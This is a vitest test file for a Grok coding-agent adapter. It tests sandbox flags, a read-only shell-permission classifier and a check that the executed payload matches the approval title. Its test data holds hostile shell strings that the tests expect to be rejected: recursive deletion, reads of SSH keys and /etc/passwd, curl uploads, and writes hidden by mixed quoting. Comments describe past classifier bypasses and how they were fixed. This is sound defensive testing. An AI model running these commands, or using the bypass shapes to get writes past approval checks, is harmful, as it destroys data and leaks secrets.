import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import * as path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { isAdapterError } from '../spi.js';
import {
  GROK_PROVIDER_BIN_ENV_VAR,
  MINIMUM_GROK_VERSION,
  assertGrokMinimumVersion,
  buildGrokAcpArgs,
  checkGrokMinimumVersion,
  grokShellPermissionTitle,
  isGrokReadOnlyShellPermissionTitle,
  grokShellPayloadMatchesTitle,
  parseGrokVersion,
  resolveGrokCommand,
  tryResolveGrokCommand,
} from './command.js';

const tempDirs: string[] = [];
function tempDir(): string {
  const dir = mkdtempSync(path.join(tmpdir(), 'grok-command-test-'));
  tempDirs.push(dir);
  return dir;
}

function fakeGrok(version: string, root = tempDir()): string {
  const bin = path.join(root, 'grok');
  writeFileSync(bin, `#!/bin/sh\nprintf 'grok ${version} (test) [stable]\\n'\n`, 'utf8');
  chmodSync(bin, 0o700);
  return bin;
}

afterEach(() => {
  while (tempDirs.length > 0) {
    const dir = tempDirs.pop();
    if (dir !== undefined) rmSync(dir, { recursive: true, force: true });
  }
});

describe('buildGrokAcpArgs', () => {
  it('pins security, model, effort, role sandbox, and official ACP subcommands', () => {
    expect(
      buildGrokAcpArgs({ model: 'grok-build', reasoningEffort: 'high', role: 'implementor' }),
    ).toEqual([
      '--no-auto-update',
      '--no-memory',
      '--no-subagents',
      '--disable-web-search',
      '--sandbox',
      'strict',
      '--permission-mode',
      'auto',
      '--model',
      'grok-build',
      '--reasoning-effort',
      'high',
      'agent',
      '--no-leader',
      'stdio',
    ]);
  });

  it('fails closed to the read-only sandbox for non-implementors and an absent role', () => {
    for (const args of [
      buildGrokAcpArgs({ role: 'coordinator' }),
      buildGrokAcpArgs({ role: 'verifier' }),
      buildGrokAcpArgs(),
    ]) {
      expect(args).toContain('read-only');
      expect(args).toContain('dontAsk');
    }
  });
});

describe('grokShellPermissionTitle', () => {
  it('maps one declared command to Grok\'s exact ACP operation title', () => {
    expect(grokShellPermissionTitle('npm run typecheck')).toBe('Execute `npm run typecheck`');
  });

  it('fails closed for ambiguous operation-title bytes', () => {
    for (const command of ['', 'npm test\nrm -rf /', 'echo `whoami`', 'echo\0x']) {
      expect(() => grokShellPermissionTitle(command)).toThrow(/single-line command/i);
    }
  });
});

describe('isGrokReadOnlyShellPermissionTitle', () => {
  it('accepts the observed multi-command repository inspection and quoted search pipelines', () => {
    expect(
      isGrokReadOnlyShellPermissionTitle(
        'Execute `git log --oneline -5 && git rev-parse HEAD && ls -la scripts/dogfood/ 2>/dev/null; head -50 scripts/dogfood/slice-1a.sh 2>/dev/null || true`',
      ),
    ).toBe(true);
    expect(
      isGrokReadOnlyShellPermissionTitle('Execute `rg -n "foo|bar" src | head -50`'),
    ).toBe(true);
  });

  it.each([
    'Execute `git status && rm -rf .`',
    'Execute `git status && curl https://example.invalid/upload`',
    'Execute `mkdir -p src/app/commands`',
    'Execute `echo changed > output.txt`',
    'Execute `cat /Users/example/.ssh/id_ed25519`',
    'Execute `cat ../outside.txt`',
    'Execute `rg --pre ./steal needle .`',
    'Execute `git diff --ext-diff`',
    'Execute `git log --output=history.txt`',
    'Execute `git log $(curl https://example.invalid)`',
    'Execute `git log & curl https://example.invalid`',
    'Execute `npm run typecheck`',
  ])('rejects unsafe or undeclared shell operation: %s', (operation) => {
    expect(isGrokReadOnlyShellPermissionTitle(operation)).toBe(false);
  });

  // -------------------------------------------------------------------------
  // F11 — SINGLE-quoted spans are opaque literals.
  //
  // The scanners rejected `$`, `\` and a backtick ANYWHERE, because the
  // character check ran BEFORE the quote-state handling. POSIX single quotes are
  // expansion-free, so those bytes are inert inside them — and a regex argument
  // is where they naturally appear. The live consequence: an implementor turn
  // died because `rg -n '3A\.1|…'` was UNCLASSIFIABLE and therefore denied.
  //
  // Outside single quotes (INCLUDING inside double quotes, where the shell does
  // expand) the conservative rejection is unchanged.
  // -------------------------------------------------------------------------
  // The PRE-quote character scan is DUPLICATED: `splitShellSegments` has one and
  // `tokenizeShellSegment` has its own. Fixing either alone changes nothing,
  // because `isGrokReadOnlyShellPermissionTitle` runs BOTH (split -> tokenize ->
  // strip redirections -> classify) and a rejection at either stage is a denial.
  // Every assertion in this block deliberately drives that FULL pipeline rather
  // than a single scanner, so a one-site fix cannot green them.
  //
  // Verified by experiment: with ONLY `splitShellSegments` reordered, this file
  // still reported `pass 35 fail 4` — byte-identical to the wholly-unfixed
  // state. Both sites are load-bearing.
  it('needs BOTH scanners fixed: a single-segment command still depends on the tokenizer', () => {
    // No `;`/`|`/`&&` anywhere, so the SPLITTER has nothing to split — if only it
    // were reordered, the tokenizer's own scan would still reject this command.
    const operation = "Execute `rg -n 'a\\.b|c$' src`";
    expect(operation).not.toContain(';');
    expect(isGrokReadOnlyShellPermissionTitle(operation)).toBe(true);
  });

  it('accepts the exact command whose denial killed the implementor turn (single-quoted regex)', () => {
    expect(
      isGrokReadOnlyShellPermissionTitle(
        "Execute `git show 481e772:docs/UI-IMPLEMENTATION-PLAN.md | head -n 5; rg -n '3A\\.1|ApplicationCommand|Phase A0' docs/UI-IMPLEMENTATION-PLAN.md | head -50; ls -la src/cli/ src/app/ 2>/dev/null | head -80`",
      ),
    ).toBe(true);
  });

  it.each([
    ["a backslash escape in a single-quoted regex", "Execute `rg -n '3A\\.1' docs/plan.md`"],
    ['a literal $ anchor in a single-quoted regex', "Execute `rg -n 'foo$' src`"],
    ['single-quoted command-substitution TEXT (inert: sh never expands it)', "Execute `rg -n '$(rm -rf /)' src`"],
    ['single-quoted parentheses/braces', "Execute `rg -n '(a|b){2}' src`"],
  ])('accepts %s', (_label, operation) => {
    expect(isGrokReadOnlyShellPermissionTitle(operation)).toBe(true);
  });

  it.each([
    ['the same regex DOUBLE-quoted (the shell WOULD expand it)', 'Execute `rg -n "3A\\.1|ApplicationCommand" docs/plan.md`'],
    ['a double-quoted $ (parameter expansion is live)', 'Execute `rg -n "$HOME" src`'],
    ['a double-quoted command substitution', 'Execute `rg -n "$(cat /etc/passwd)" src`'],
    ['an UNQUOTED command substitution', 'Execute `rg -n $(cat /etc/passwd) src`'],
    ['an unquoted backslash', 'Execute `rg -n 3A\\.1 docs/plan.md`'],
    ['an unquoted parenthesis (subshell)', 'Execute `(rg -n foo src)`'],
    ['an UNTERMINATED single quote', "Execute `rg -n 'unterminated src`"],
  ])('still rejects %s', (_label, operation) => {
    expect(isGrokReadOnlyShellPermissionTitle(operation)).toBe(false);
  });

  it('a single-quoted span never smuggles a segment separator or a redirection', () => {
    // `;` / `&&` / `|` / `>` inside single quotes are literal ARGUMENT bytes, so
    // the command stays ONE segment whose leading token is still an allowlisted
    // reader — it cannot introduce a second, unclassified command.
    expect(isGrokReadOnlyShellPermissionTitle("Execute `rg -n 'a; rm -rf /' src`")).toBe(true);
    expect(isGrokReadOnlyShellPermissionTitle("Execute `rg -n 'a > out.txt' src`")).toBe(true);
    // ...while the UNQUOTED forms are classified as what they are.
    expect(isGrokReadOnlyShellPermissionTitle('Execute `rg -n a src; rm -rf /`')).toBe(false);
    expect(isGrokReadOnlyShellPermissionTitle('Execute `rg -n a src > out.txt`')).toBe(false);
  });

  it('a single-quoted ESCAPING path argument is still refused (quoting is not a bypass)', () => {
    expect(isGrokReadOnlyShellPermissionTitle("Execute `cat '/etc/passwd'`")).toBe(false);
    expect(isGrokReadOnlyShellPermissionTitle("Execute `cat '../outside.txt'`")).toBe(false);
  });

  // -------------------------------------------------------------------------
  // BLOCKER-1 — a token that MIXES quoted and unquoted parts must not inherit
  // blanket-quoted status.
  //
  // `tokenizeShellSegment` set ONE `quoted` flag for the whole token, so
  // `echo '$HOME'>owned.txt` produced a single token `$HOME>owned.txt` marked
  // quoted — and `stripSafeRedirections` only checks for `>` when a token is
  // NOT quoted. The classifier therefore returned read-only for a command that
  // sh really does execute as a WRITE. `<` escaped this only by accident (the
  // segment splitter rejects `<` outside quotes; `>` was never in that list).
  //
  // The rule that fixes it is exactly sh's own: token recognition happens
  // BEFORE quote removal, so a redirection operator is one that appears
  // OUTSIDE quotes. Provenance is therefore tracked per CHARACTER.
  // -------------------------------------------------------------------------
  it.each([
    ['the reported bypass verbatim', "Execute `echo '$HOME'>owned.txt`"],
    ['the same shape without a $ (the hole predates the F11 widening)', "Execute `echo 'x'>owned.txt`"],
    ['a DOUBLE-quoted mixed token', 'Execute `echo "x">owned.txt`'],
    ['append redirection', "Execute `echo 'x'>>owned.txt`"],
    ['fd-qualified write', "Execute `cat 'a'2>owned`"],
    ['a mixed token that only LOOKS like a safe null redirection', "Execute `echo x'2>/dev/nul'l>owned.txt`"],
    ['no whitespace anywhere between the quoted part and the operator', "Execute `ls'>'x>owned.txt`"],
  ])('refuses a WRITE hidden by mixed quoting: %s', (_label, operation) => {
    expect(isGrokReadOnlyShellPermissionTitle(operation)).toBe(false);
  });

  it.each([
    ['a standalone safe null redirection', 'Execute `ls -la 2>/dev/null`'],
    ['a standalone 1>/dev/null', 'Execute `head -5 f 1>/dev/null`'],
    ['a standalone >/dev/null', 'Execute `head -5 f >/dev/null`'],
    ['a > wholly INSIDE single quotes (a literal argument, not an operator)', "Execute `rg -n '>' src`"],
    ['a > inside a longer single-quoted pattern', "Execute `rg -n 'a>b' src`"],
    ['a quoted token that merely looks like a redirection is a FILENAME', "Execute `cat f '2>/dev/null'`"],
    ['a > quoted mid-token is still not an operator (sh recognises operators pre-quote-removal)', "Execute `echo x'2>/dev/null'`"],
  ])('still admits %s', (_label, operation) => {
    expect(isGrokReadOnlyShellPermissionTitle(operation)).toBe(true);
  });

  // -------------------------------------------------------------------------
  // MED-9 — the title wrapper is parsed STRUCTURALLY, so a literal backtick
  // inside quotes can reach the quote-aware scanners instead of being rejected
  // by a no-backtick capture that could never see the quoting.
  // -------------------------------------------------------------------------
  it('accepts a literal backtick INSIDE single quotes (the old capture made this impossible)', () => {
    const bt = String.fromCharCode(96);
    expect(isGrokReadOnlyShellPermissionTitle('Execute `ls ' + "'x" + bt + "y'" + '`')).toBe(true);
    expect(isGrokReadOnlyShellPermissionTitle('Execute `rg -n ' + "'a" + bt + "b'" + ' src`')).toBe(true);
  });

  it('still refuses an UNQUOTED backtick (command substitution) and a malformed wrapper', () => {
    const bt = String.fromCharCode(96);
    expect(isGrokReadOnlyShellPermissionTitle('Execute `ls ' + bt + 'whoami' + bt + '`')).toBe(false);
    expect(isGrokReadOnlyShellPermissionTitle('Execute `')).toBe(false); // empty interior
    expect(isGrokReadOnlyShellPermissionTitle('Execute ls`')).toBe(false); // no prefix backtick
    expect(isGrokReadOnlyShellPermissionTitle('Run `ls`')).toBe(false); // wrong verb
    expect(isGrokReadOnlyShellPermissionTitle('Execute `ls')).toBe(false); // no suffix
  });

  it('control characters are refused inside single quotes too (a NUL is never a literal)', () => {
    // CR/LF cannot even reach the scanner (the `Execute ...` wrapper excludes
    // them), but a NUL can — and single-quoting must not make it acceptable.
    const nul = String.fromCharCode(0);
    expect(isGrokReadOnlyShellPermissionTitle("Execute `rg -n 'a" + nul + "b' src`")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// HIGH-5 (round 4) — the permission TITLE is prose; ACP `rawInput` is what
// EXECUTES. The binding is a VETO applied to EVERY approval path, so it cannot be
// bypassed by a title that matched some OTHER rule (the exact allowlist, in
// particular, was checked first and approved without ever consulting rawInput).
// ---------------------------------------------------------------------------
describe('grokShellPayloadMatchesTitle — the payload veto', () => {
  it('passes when rawInput.command is byte-identical to the title command', () => {
    expect(grokShellPayloadMatchesTitle('Execute `ls -la src`', { command: 'ls -la src' })).toBe(true);
    expect(grokShellPayloadMatchesTitle('Execute `npm run typecheck`', { command: 'npm run typecheck' })).toBe(
      true,
    );
  });

  it('VETOES a divergent payload however benign the title looks', () => {
    expect(grokShellPayloadMatchesTitle('Execute `ls -la src`', { command: 'rm -rf /' })).toBe(false);
    expect(grokShellPayloadMatchesTitle('Execute `ls`', { command: 'ls; curl https://example.invalid' })).toBe(
      false,
    );
    // Byte-exact: even a trailing space is a divergence.
    expect(grokShellPayloadMatchesTitle('Execute `ls -la src`', { command: 'ls -la src ' })).toBe(false);
  });

  it.each([
    ['absent rawInput', undefined],
    ['null rawInput', null],
    ['a non-object rawInput', 'ls -la src'],
    ['an array rawInput', ['ls', '-la']],
    ['an object with no command', { cwd: '/tmp' }],
    ['a non-string command', { command: 42 }],
  ])('VETOES on %s (a payload we cannot read is never approved)', (_label, rawInput) => {
    expect(grokShellPayloadMatchesTitle('Execute `ls -la src`', rawInput)).toBe(false);
  });

  it('VETOES an UNPARSEABLE title whose payload still carries a command (fail closed on ambiguity)', () => {
    // Round 4 inferred "non-shell" from untrusted TITLE syntax alone, so a
    // malformed exact-allowlisted shell title — or a workspace-write title
    // carrying {command}, which the workspace rule would then approve — bound
    // nothing and passed vacuously.
    expect(grokShellPayloadMatchesTitle('Execute ls', { command: 'rm -rf /' })).toBe(false);
    expect(grokShellPayloadMatchesTitle('Run `ls`', { command: 'ls' })).toBe(false);
    expect(grokShellPayloadMatchesTitle('Write `/repo/src/a.ts`', { command: 'rm -rf /' })).toBe(false);
    expect(grokShellPayloadMatchesTitle(undefined, { command: 'rm -rf /' })).toBe(false);
  });

  it('does NOT veto a non-shell operation (there is no shell payload to bind)', () => {
    // Structured Write/Edit titles are adjudicated by the workspace-write rule;
    // the shell payload veto must not deny them for lacking a shell command.
    expect(grokShellPayloadMatchesTitle('Write `/repo/src/a.ts`', undefined)).toBe(true);
    expect(grokShellPayloadMatchesTitle('Edit `/repo/src/a.ts`', { path: '/repo/src/a.ts' })).toBe(true);
  });
});

describe('Grok command resolution and minimum version', () => {
  it('prefers the explicit GROK_PROVIDER_BIN and parses the installed version', () => {
    const override = fakeGrok('0.2.106');
    const otherDir = tempDir();
    fakeGrok('9.9.9', otherDir);
    const resolved = resolveGrokCommand({
      env: { [GROK_PROVIDER_BIN_ENV_VAR]: override, PATH: otherDir },
      model: 'grok-build',
    });
    expect(resolved.command).toBe(override);
    expect(resolved.binPath).toBe(override);
    expect(resolved.version).toBe('0.2.106');
    expect(resolved.packageName).toBe('grok-build');
    expect(resolved.args).toContain('grok-build');
  });

  it('resolves grok from PATH when no override is configured', () => {
    const root = tempDir();
    const bin = fakeGrok('0.2.107', root);
    expect(resolveGrokCommand({ env: { PATH: root } }).binPath).toBe(bin);
  });

  it('does not fall back to PATH when an explicit override is invalid', () => {
    const root = tempDir();
    fakeGrok('9.9.9', root);
    const result = tryResolveGrokCommand({
      env: { PATH: root, [GROK_PROVIDER_BIN_ENV_VAR]: path.join(root, 'missing') },
    });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.kind).toBe('spawn_failed');
  });

  it('returns a typed spawn failure when no executable is available', () => {
    const result = tryResolveGrokCommand({ env: { PATH: tempDir() } });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(isAdapterError(result.error)).toBe(true);
  });

  it('accepts the characterized minimum or newer and rejects older/prerelease equivalents', () => {
    expect(checkGrokMinimumVersion('0.2.106').supported).toBe(true);
    expect(checkGrokMinimumVersion('0.2.107').supported).toBe(true);
    expect(checkGrokMinimumVersion('0.3.0').supported).toBe(true);
    expect(checkGrokMinimumVersion('0.2.105').supported).toBe(false);
    expect(checkGrokMinimumVersion('0.2.106-beta.1').supported).toBe(false);
  });

  it('fails loudly when the installed binary predates the minimum', () => {
    const bin = fakeGrok('0.2.105');
    expect(() =>
      assertGrokMinimumVersion({ env: { [GROK_PROVIDER_BIN_ENV_VAR]: bin } }),
    ).toThrowError(new RegExp(MINIMUM_GROK_VERSION.replaceAll('.', '\\.')));
  });

  it('parses only Grok version output', () => {
    expect(parseGrokVersion('grok 0.2.106 (abc) [stable]')).toBe('0.2.106');
    expect(parseGrokVersion('other 0.2.106')).toBeUndefined();
  });
});
